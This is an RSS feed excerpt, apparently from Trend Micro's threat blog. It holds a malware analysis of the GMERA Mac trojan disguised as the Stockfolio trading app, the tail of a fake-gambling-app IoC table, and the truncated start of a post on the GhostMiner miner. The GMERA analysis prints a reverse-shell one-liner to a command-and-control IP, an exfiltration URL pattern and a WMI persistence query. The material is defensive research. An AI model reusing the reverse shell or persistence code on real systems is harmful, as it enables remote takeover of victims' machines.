<tr>
<td style="text-align: center" width="90">com.jiu.ou.id2957</td>
<td style="text-align: center" width="190">6C368EF20A419C3E792435C9DAF3CE9CD239611BDD6D40840CA70E56669B5A24</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id2969</td>
<td style="text-align: center" width="190">1338C22DE793CF4C6F523A6C1A42C9EEFE5886F3C345ADF2D469C90323CC0691</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id2968</td>
<td style="text-align: center" width="190">35B16C8A575B586BA10D0CEF9DB0356E7EBEDF93F887F3A5E90BD971557204D2</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id3001</td>
<td style="text-align: center" width="190">DAF9E73A4B256D15D9A231B12A0DCDBD4BB152F6557BFF76D184A9286A2DB456</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id3006</td>
<td style="text-align: center" width="190">C8355E6A056884CD781A36302CC8CE66CE1A912100AE37B28DBE44D3FDD2D702</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id3007</td>
<td style="text-align: center" width="190">375EB929AF991AFA92769DE5D285BC7E4085150BD585335D4BDC460101849970</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id3000</td>
<td style="text-align: center" width="190">6ADCD1D37D0024EA9E3C443BE029A774D845E2A9EFF48DD43988B05161454077</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id3002</td>
<td style="text-align: center" width="190">42F90F0B9B635057170933AA8E73E869728B797010C6CA4891FA59E4D63F377C</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
<tr>
<td style="text-align: center" width="90">com.jiu.ou.id3010</td>
<td style="text-align: center" width="190">4DD441A5559E9F17B3A275AFDD73E18FEB27BFB37E9F9C027CEE8D62A268E846</td>
<td style="text-align: center" width="40">1.0</td>
</tr>
</tbody>
</table>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/gambling-apps-sneak-top-100-hundreds-fake-apps-spread-app-store-google-play/">Gambling Apps Sneak into Top 100: How Hundreds of Fake Apps Spread on iOS App Store and Google Play</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=WFi0W1kTJqw:3KnO_YLwViM:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=WFi0W1kTJqw:3KnO_YLwViM:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=WFi0W1kTJqw:3KnO_YLwViM:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=WFi0W1kTJqw:3KnO_YLwViM:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=WFi0W1kTJqw:3KnO_YLwViM:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=WFi0W1kTJqw:3KnO_YLwViM:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=WFi0W1kTJqw:3KnO_YLwViM:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=WFi0W1kTJqw:3KnO_YLwViM:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=WFi0W1kTJqw:3KnO_YLwViM:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=WFi0W1kTJqw:3KnO_YLwViM:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/WFi0W1kTJqw" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/gambling-apps-sneak-top-100-hundreds-fake-apps-spread-app-store-google-play/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/gambling-apps-sneak-top-100-hundreds-fake-apps-spread-app-store-google-play/</feedburner:origLink></item>
		<item>
		<title>Mac Malware that Spoofs Trading App Steals User Information, Uploads it to Website</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/4W6-ZvHWP24/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/#respond</comments>
				<pubDate>Fri, 20 Sep 2019 11:51:45 +0000</pubDate>
		<dc:creator><![CDATA[Trend Micro]]></dc:creator>
				<category><![CDATA[Mac]]></category>
		<category><![CDATA[Malware]]></category>
		<category><![CDATA[app]]></category>
		<category><![CDATA[Trojan]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86088</guid>
				<description><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p>We recently found and analyzed a malicious malware variant that disguised itself as a legitimate Mac-based trading app called Stockfolio. We found two variants of the malware family. The first one contains a pair of shell scripts and connects to a remote site to decrypt its encrypted codes while the second sample, despite using a simpler routine involving a single shell script, is actually incorporates a persistence mechanism.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/">Mac Malware that Spoofs Trading App Steals User Information, Uploads it to Website</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p><em><strong>by Luis Magisa</strong></em></p>
<p>Unlike in the pre-internet era, when trading in the stock or commodities market involved a phone call to a broker — a move which often meant additional fees for would-be traders — the rise of trading apps placed the ability to trade in the hands of ordinary users. However, their popularity has led to their abuse by cybercriminals who create fake trading apps as lures for unsuspecting victims to steal their personal data. We recently found and analyzed an example of such an app, which had a malicious malware variant that disguised itself as a legitimate Mac-based trading app called <a href="https://stockfolioapp.com/,">Stockfolio</a>.</p>
<p><strong> </strong>We found two variants of the malware family. The first one contains a pair of shell scripts and connects to a remote site to decrypt its encrypted codes while the second sample, despite using a simpler routine involving a single shell script, actually incorporates a persistence mechanism.</p>
<h4><strong>Sample 1: </strong><strong>Trojan.MacOS.GMERA.A</strong></h4>
<p>We found the first sample (detected as Trojan.MacOS.GMERA.A) while checking suspicious shell scripts that were flagged by our <a href="https://www.trendmicro.com/vinfo/ph/security/definition/machine-learning">machine learning</a> system. At first glance, it was challenging to directly identify its malicious behavior because the shell script references other files such as AppCode, .pass and .app. To verify that the behavior was indeed malicious, we sourced the parent file using both our infrastructure and the aggregate website VirusTotal (which had the sample but lacked detections from other major security vendors at the time of writing).</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-1.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-1.png" alt=" Figure 1. The suspicious shell script which was flagged by our system" width="550" /></a></p>
<p align="center">Figure 1. The suspicious shell script which was flagged by our system</p>
<p>The initial sample we analyzed was a zip archive file (detected as Trojan.MacOS.GMERA.A) that contained an app bundle (<em>Stockfoli.app</em>) and a hidden encrypted file (.app). The fake app presents itself as legitimate to trick users, but we found that it contained several malicious components.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-2.png" alt="Figure 2. Content of the zip file. Note that the app bundle is missing the “o” at the end, whereas the legitimate app is called Stockfolio." width="550" /></a></p>
<p align="center">Figure 2. Content of the zip file. Note that the app bundle is missing the “o” at the end, whereas the legitimate app is called Stockfolio.</p>
<h4><strong>The zip file and its contents</strong></h4>
<p>The first suspicious component we found was an app bundle under the Resources directory, which seems to be a copy of the legitimate Stockfolio version 1.4.13 but with the malware author’s digital certificate.</p>
<p>Comparing it to the Resources directory of the current version (1.5) found on the Stockfolio website revealed a number of differences, as shown in the figure below.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-3-1.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-3-1.png" alt=" Figure 3. Comparison of the app bundle folder structure between the malware variant (top) and the legitimate app (version 1.5, bottom)." width="300" /></a></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-3-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-3-2.png" alt=" Figure 3. Comparison of the app bundle folder structure between the malware variant (top) and the legitimate app (version 1.5, bottom)." width="300" /></a></p>
<p align="center">Figure 3. Comparison of the app bundle folder structure between the malware variant (top) and the legitimate app (version 1.5, bottom).</p>
<h4><strong>Technical Analysis</strong></h4>
<p>When the app is executed, an actual trading app interface will appear on-screen.  However, unbeknownst to the user, the malware variant is already performing its malicious routines in the background.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-4.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-4.png" alt=" Figure 4. interface displayed when the malware app bundle is executed" width="550" /></a></p>
<p align="center">Figure 4. interface displayed when the malware app bundle is executed</p>
<p>The main Mach-O executable will launch the following bundled shell scripts in the Resources directory:</p>
<ul>
<li>plugin</li>
<li>stock</li>
</ul>
<h4><strong>The plugin and stock shell scripts</strong></h4>
<p>The plugin shell script collects the following information from the infected system:</p>
<ul>
<li>username</li>
<li>IP address</li>
<li>apps in <em>/Applications</em></li>
<li>files in <em>~/Documents</em></li>
<li>files in<em> ~/Desktop</em></li>
<li>OS installation date</li>
<li>file system disk space usage</li>
<li>graphic/display information</li>
<li>wireless network information</li>
<li>screenshots</li>
</ul>
<p>It then encodes the collected information using base64 encoding and saves the collected information in a hidden file: <em>/tmp/.info</em>. It then uploads the file to <em>hxxps://appstockfolio.com/panel/upload[.]php</em> using the collected username and machine serial number as identifiers.</p>
<p>If a successful response is sent from the URL, it will write the response in another hidden file <em>~/Library/Containers/.pass</em></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-5.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-5.png" alt="Figure 5 . The “plugin” script " width="550" /></a></p>
<p align="center">Figure 5 . The “plugin” script</p>
<p>The stock shell script will copy <em>Stockfoli.app/Contents/Resources/appcode</em> to <em>/private/var/tmp/appcode</em>. It then locates the .app file, which is the hidden file in the zip bundle that comes with <em>Stockfoli.app</em></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-6.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-6.png" alt=" Figure 6. The “stock” script" width="550" /></a></p>
<p align="center">Figure 6. The “stock” script</p>
<p>It decodes the b64-encoded .app file, executes it, then drops the following:</p>
<table>
<tbody>
<tr>
<td width="277">File</td>
<td width="277">Details</td>
</tr>
<tr>
<td width="277"><em>/tmp/.hostname</em></td>
<td width="277">gmzera54l5qpa6lm.onion</td>
</tr>
<tr>
<td width="277"><em>/tmp/.privatkey</em></td>
<td width="277">RSA private key</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>It will delete the .app file then check if the file <em>~/Library/Containers/.pass</em> exists. Using the contents of the ‘.pass’ file as the key, the malware variant will decrypt <em>/private/var/tmp/appcode</em>, which is encrypted using AES-256-CBC. It then saves the decrypted file to <em>/tmp/appcode</em>. Finally, it will execute the appcode. If it fails to do so, it will delete the /tmp/appcode file and <em>~/Library/Containers/.pass</em>. Note that in the sample we analyzed, the decryption routine failed since the sample was not able to create <em>~/Library/Containers/.pass.</em></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-7.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-7.png" alt=" Figure 7. Comparison of the code-signing information of the malicious app (top) and the legitimate Stockfolio app (bottom)" width="550" /></a></p>
<p align="center">Figure 7. Comparison of the code-signing information of the malicious app (top) and the legitimate Stockfolio app (bottom)</p>
<p>We suspect the file appcode is a malware file that contains additional routines. However, at the time of writing, we were unable to decrypt this file since the upload URL <em>hxxps://appstockfolio.com/panel/upload[.]php </em>was inaccessible (according to VirusTotal, the domain was active from January to February 2019). Furthermore, we suspect that the full malware routine uses the TOR network due to the presence of the unused address <em>gmzera54l5qpa6lm[.]onion</em>.</p>
<h4><strong>Sample 2: Trojan.MacOS.GMERA.B</strong></h4>
<p>Using the digital certificate of the first sample, we were able to find a second variant (detected as Trojan.MacOS.GMERA.B) that was uploaded to VirusTotal on June 2019. Like the first variant, it contains an embedded copy of Stockfolio.app version 1.4.13 with the malware author’s digital certificate. It launches the app in a similar manner when executed to disguise its malicious intent.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-8.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-8.png" alt=" Figure 8. The bundle structure of Trojan.MacOS.GMERA.B" width="300" /></a></p>
<p align="center">Figure 8. The bundle structure of Trojan.MacOS.GMERA.B</p>
<p>Once opened, Trojan.MacOS.GMERA.B will execute the embedded copy of Stockfolio version 1.4.13, after which it will launch the shell script <em>run.sh</em></p>
<p>The script <em>run.sh</em> collects usernames and ip addresses from the infected machine via the following command:</p>
<ul>
<li>username = ‘whoami’</li>
<li>ip address = &#8216;curl -s ipecho.net/plain&#8217;</li>
</ul>
<p>It connects to the malware URL hxxp://owpqkszz[.]info to send the username and IP address information using the following format:</p>
<ul>
<li>hxxp://owpqkszz[.]info/link.php?{username}&amp;{ip address}</li>
</ul>
<p>As part of its routine, the malware also drops the following files:</p>
<table>
<tbody>
<tr>
<td width="309">File</td>
<td width="309">Details</td>
</tr>
<tr>
<td width="309"><em>/private/tmp/.com.apple.upd.plist</em></td>
<td width="309">Copy of ~/Library/LaunchAgents/.com.apple.upd.plist</td>
</tr>
<tr>
<td width="309"><em>~/Library/LaunchAgents/.com.apple.upd.plist</em></td>
<td width="309">Persistence mechanism</td>
</tr>
<tr>
<td width="309"><em>/tmp/loglog</em></td>
<td width="309">Malware execution logs</td>
</tr>
</tbody>
</table>
<p>It then creates a simple reverse shell to the C&amp;C server 193[.]37[.]212[.]176. Once connected, the malware author can run shell commands.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-9.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-9.png" alt="Figure 9. Content of the run.sh shell script" width="550" /></a></p>
<p align="center">Figure 9. Content of the run.sh shell script</p>
<p>One of the primary changes found in the second variant, aside from the simplified routine, is the presence of a persistence mechanism via the creation of a property list (plist) file: <em>~/Library/LaunchAgents/.com.apple.upd.plist</em></p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-10.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/stockfoli-mac-malware-10.png" alt=" Figure 10. Hidden plist file used for persistence." width="550" /></a></p>
<p align="center">Figure 10. Hidden plist file used for persistence</p>
<p>After we decoded the b64-encoded arguments for the plist file, we found the following code:</p>
<ul>
<li>while :; do sleep 10000; screen -X quit; lsof -ti :25733 | xargs kill -9; screen -d -m bash -c &#8216;bash -i &gt;/dev/tcp/193.37.212.176/25733 0&gt;&amp;1&#8217;; done</li>
</ul>
<p>This code instructs the plist file to constantly create the reverse shell mentioned earlier, occuring every 10,000 seconds.</p>
<p>The simple reverse shell created was observed to use the ports 25733-25736.</p>
<h4><strong>Conclusion</strong></h4>
<p>Given the changes we’ve seen from the malware variant’s initial iteration to its current one, we notice a trend in which the malware authors have simplified its routine and added further capabilities. It’s possible that the people behind it are looking for ways to make it more efficient – perhaps even adding evasion mechanisms in the future.</p>
<p>In the meantime, we advise aspiring traders to practice caution when it comes to the programs they download, especially if it comes from an unknown or suspicious website. We recommend that users only download apps from official sources to minimize chances of downloading a malicious one.</p>
<p>We reached out to Apple before publication of this entry, and they informed us that the code signing certificate of this fake app&#8217;s developers was revoked in July of this year.</p>
<h4><strong>Trend Micro solutions</strong></h4>
<p>End users can benefit from security solutions such as <a href="https://www.trendmicro.com/en_ca/forHome/products/maximum-security.html">Trend Micro Home Security for Mac</a>, which provides comprehensive security and multi-device protection against cyberthreats.  Enterprises can benefit from Trend Micro’s <a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps.html">Smart Protection Suites</a> with XGen<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint.</p>
<h4><strong>Indicators of Compromise (IoCs)</strong></h4>
<h4><strong>Sample 1</strong></h4>
<table>
<tbody>
<tr>
<td width="120"><strong>Filename</strong></td>
<td width="514"><strong>SHA256</strong></td>
<td width="171"><strong>Detection name</strong></td>
</tr>
<tr>
<td width="120">plugin</td>
<td width="514">6fe741ef057d38dd6d9bbe02dacbcb4940dac6c32e0f50a641e73727d6bf60d9</td>
<td width="171">Trojan.SH.GMERA.A</td>
</tr>
<tr>
<td width="120">stock</td>
<td width="514">6f48ef0d76ce68bbca53b05d2d22031aec5ce997e7227c3dcb20809959680f11</td>
<td width="171">Trojan.SH.GMERA.A</td>
</tr>
<tr>
<td width="120">Stockfoli</td>
<td width="514">efd5b96f489f934f2465a185e43fddf50fcde51b12a8fb91d5d93b09a21706c7</td>
<td width="171">Trojan.MacOS.GMERA.A</td>
</tr>
<tr>
<td width="120">Trial_Stockfoli.zip</td>
<td width="514">18e1db7c37a63d987a5448b4dd25103c8053799b0deea5f45f00ca094afe2fe7</td>
<td width="171">Trojan.MacOS.GMERA.A</td>
</tr>
</tbody>
</table>
<h4><strong>Sample 2</strong></h4>
<table>
<tbody>
<tr>
<td width="144"><strong>Filename</strong></td>
<td width="511"><strong>SHA256</strong></td>
<td width="169"><strong>Detection name</strong></td>
</tr>
<tr>
<td width="144">com.apple.upd.plist</td>
<td width="511">be8b6549da925f285307b17c616a010a9418af70d090ed960ade575ce27c7787</td>
<td width="169">Trojan.MacOS.GMERA.B</td>
</tr>
<tr>
<td width="144">run.sh</td>
<td width="511">d50f5e94f2c417623c5f573963cc777c0676cc7245d65967ca09a53f464d2b50</td>
<td width="169">Trojan.SH.GMERA.B</td>
</tr>
<tr>
<td width="144">Stockfoli</td>
<td width="511">83df2f39140679a9cfb55f9c839ff8e7638ba29dba164900f9c77bb177796e03 (sample 2)</td>
<td width="169">Trojan.MacOS.GMERA.B</td>
</tr>
<tr>
<td width="144">Trial_Stockfoli.zip</td>
<td width="511">faa2799751582b8829c61cbfe2cbaf3e792960835884b61046778d17937520f4 (sample 2)</td>
<td width="169">Trojan.MacOS.GMERA.B</td>
</tr>
</tbody>
</table>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/">Mac Malware that Spoofs Trading App Steals User Information, Uploads it to Website</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=4W6-ZvHWP24:r_3ZfDRx_hE:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=4W6-ZvHWP24:r_3ZfDRx_hE:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=4W6-ZvHWP24:r_3ZfDRx_hE:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=4W6-ZvHWP24:r_3ZfDRx_hE:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=4W6-ZvHWP24:r_3ZfDRx_hE:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=4W6-ZvHWP24:r_3ZfDRx_hE:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=4W6-ZvHWP24:r_3ZfDRx_hE:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=4W6-ZvHWP24:r_3ZfDRx_hE:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=4W6-ZvHWP24:r_3ZfDRx_hE:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=4W6-ZvHWP24:r_3ZfDRx_hE:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/4W6-ZvHWP24" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/</feedburner:origLink></item>
		<item>
		<title>Fileless Cryptocurrency-Miner GhostMiner Weaponizes WMI Objects, Kills Other Cryptocurrency-Mining Payloads</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/luYFo5ENt90/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/fileless-cryptocurrency-miner-ghostminer-weaponizes-wmi-objects-kills-other-cryptocurrency-mining-payloads/#respond</comments>
				<pubDate>Thu, 19 Sep 2019 12:14:56 +0000</pubDate>
		<dc:creator><![CDATA[Trend Micro]]></dc:creator>
				<category><![CDATA[Malware]]></category>
		<category><![CDATA[coinminer]]></category>
		<category><![CDATA[Cyrptocurrency-miner]]></category>
		<category><![CDATA[GhostMiner]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86045</guid>
				<description><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/06/coinminer-300x299-200x200.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/06/coinminer-300x299-200x200.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/06/coinminer-300x299.jpg 300w" sizes="(max-width: 200px) 100vw, 200px" /><p>By Carl Maverick Pascual (Threats Analyst) Cybercriminals continue to use cryptocurrency-mining malware to abuse computing resources for profit. As early as 2017, we have also observed how they have applied fileless techniques to make detection and monitoring more difficult. On August 2, we observed a fileless cryptocurrency-mining malware, dubbed GhostMiner, that weaponizes Windows management instrumentation...</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/fileless-cryptocurrency-miner-ghostminer-weaponizes-wmi-objects-kills-other-cryptocurrency-mining-payloads/">Fileless Cryptocurrency-Miner GhostMiner Weaponizes WMI Objects, Kills Other Cryptocurrency-Mining Payloads</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/06/coinminer-300x299-200x200.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/06/coinminer-300x299-200x200.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/06/coinminer-300x299.jpg 300w" sizes="(max-width: 200px) 100vw, 200px" /><p><em><strong>By Carl Maverick Pascual (Threats Analyst)</strong></em></p>
<p>Cybercriminals continue to use cryptocurrency-mining malware to abuse computing resources for profit. As early as <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/cryptocurrency-miner-uses-wmi-eternalblue-spread-filelessly/">2017</a>, we have also observed how they have applied fileless techniques to make detection and monitoring more difficult.</p>
<p>On August 2, we observed a fileless cryptocurrency-mining malware, dubbed GhostMiner, that weaponizes Windows management instrumentation (WMI) objects for its fileless persistence, payload mechanisms, and AV-evasion capabilities. This GhostMiner variant was also observed to modify infected host files that are heavily used by <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-a-mykings-variant-with-bootloader-persistence-via-managed-detection-and-response/">Mykings</a><u>,</u> <a href="https://www.trendmicro.com/vinfo/ph/security/news/cybercrime-and-digital-threats/fileless-malware-powerghost-targets-corporate-systems">PowerGhost</a>, <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/monero-mining-malware-pcastle-zeroes-back-in-on-china-now-uses-multilayered-fileless-arrival-techniques/">PCASTLE</a> and <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.win32.blueroh.rpb">BULEHERO</a><u>, among others.</u></p>
<p>This malware was observed mining Monero cryptocurrency, however, the arrival details of this variant has not been identified as of writing. An earlier <a href="https://blog.minerva-labs.com/ghostminer-cryptomining-malware-goes-fileless">documented</a> sighting of GhostMiner was noted to have used multiple vulnerabilities in MSSQL, phpMyAdmin, and Oracle’s WebLogic to look for and attack susceptible servers.</p>
<h3>GhostMiner Details</h3>
<p>GhostMiner uses <a href="https://attack.mitre.org/techniques/T1084/">WMI Event Subscriptions </a>to install persistence in an infected machine as well as execute arbitrary code.</p>
<blockquote><p><strong>Event Filter</strong></p>
<p>\\.\ROOT\subscription:__EventFilter.Name=&#8221;PowerShell Event Log Filter&#8221;</p>
<p><em>EventNamespace</em> : root\cimv2</p>
<p><em>Query</em> : SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA &#8216;Win32_PerfFormattedData_PerfOS_System&#8217;</p>
<p><em>QueryLanguage</em> : WQL<strong>       </strong></p></blockquote>
<blockquote><p><strong>FilterToConsumerBinding</strong></p>
